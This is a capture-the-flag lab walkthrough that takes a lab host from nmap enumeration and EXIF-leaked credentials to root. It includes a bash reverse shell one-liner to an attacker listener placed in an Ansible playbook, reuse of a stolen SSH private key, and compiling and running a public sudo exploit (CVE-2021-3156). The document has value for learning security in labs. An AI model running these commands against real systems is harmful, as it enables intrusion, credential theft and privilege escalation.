
## Enumeration


1. Started off with my go to nmap scan I use for all labs and found multiple HTTP servers open which we can explore 
```
┌──(kali㉿kali)-[~/Documents/labs/cats-2]
└─$ nmap -sV -sC -o nmap.txt 10.113.151.67
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-03 09:12 SAST
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.72% done; ETC: 09:13 (0:00:00 remaining)
Nmap scan report for 10.113.151.67
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
|_http-server-header: nginx/1.4.6 (Ubuntu)
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
|_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
3000/tcp open  http    Golang net/http server
|_http-title:  Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=b1bf849c107568bb; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=-JcA6efuor3xHW4JrFTUGnnkot86MTc3MjUyMTk2NzI4MzM2MzY2OQ; Path=/; Expires=Wed, 04 Mar 2026 07:12:47 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 03 Mar 2026 07:12:47 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=2b8d3776e3356b54; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Ij6tExSv03RRldepbP4ik1yLiQk6MTc3MjUyMTk2OTIwMzA4ODg3NQ; Path=/; Expires=Wed, 04 Mar 2026 07:12:49 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 03 Mar 2026 07:12:49 GMT
|_    Content-Length: 0
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Welcome to nginx!

```

2. On port 80 we navigate to the first cat image, which has a note saying "remove meta data" and indicates there's hidden exif data on in the image. Downloading and extracting this data with `exiftool`, reveals a hidden path on port 8080 in the title property on the image.
3. Navigating to this path we find a users gitea login credentials on port 3000 of the lab.
4. After logging in we find flag 1 in the file called flag1.txt .

## Flag 2

1. On the same hidden directory we found the credentials for Gitea login, there was mention of another open port at 1337 which didn't show up in our initial nmap scan. Navigating to this port shows us the Olive Tin tool is running on the server and allows us to run the ansible playbook.yaml script from the github repo.
2. Going back to Gitea and changing the "command" parameter in this yaml file to a bash reverse shell one line like `bash -c "bash -i >& /dev/tcp/LOCAL_IP/9000 0>&1"`, committing it, and running it back on the Olive Tin port with `nc -nvlp 9000` running in our terminal results in giving us a reverse shell.
3. In this shell the flag2.txt is in the same directory and can be catted out for retrieval.

## Flag 3

1. In same shell we find the .ssh folder, where we have permissions to read the bismuth user's id_rsa file. So we copy its contents over to our local machine and save it in a file called id_rsa, give it the correct permissions with `chmod 600 id_rsa` and use it to login with bismuth via `ssh bismuth@targer_ip -i id_rsa` to obtain a more stable shell.
2. After this we ran the standard privilege escalation changes like checking cronjobs and sudo privileges but got nothing. So I imported our Linpeas script with this command `scp -i id_rsa /usr/share/peass/linpeas/linpeas.sh bismuth@10.113.151.67:/tmp/` and changing its permissions with `chmod +x` to run it and find privilege escalation vectors 
3. Our Linpeas script identify a sudo version vulnerability and identified as CVE-2021-3156. Googling this exploit we see the code and guide on how to implement it and obtain root privileges.
4. Our first step is to run `git clone https://github.com/blasty/CVE-2021-3156` onto our local machine than setup a python server with `python3 -m http.server 8080` and use `wget http://Locl_IP:8080/CVE-2021-3156` to pull the folder in and its files.
5. After this cd into the folder and run `make` to compile the exploit 
```
make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

```

6. After this we simply run `./sudo-hax-me-a-sandwich` and it gives the following output
```
bismuth@catpictures-ii:/tmp/exploit$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

```

7. We want to exploit the first target so rerun the same command with `./sudo-hax-me-a-sandwich 0` to select it and you will obtain root.
8. Now just cd into the root directory and cat the flag to retrieve the lab's final flag.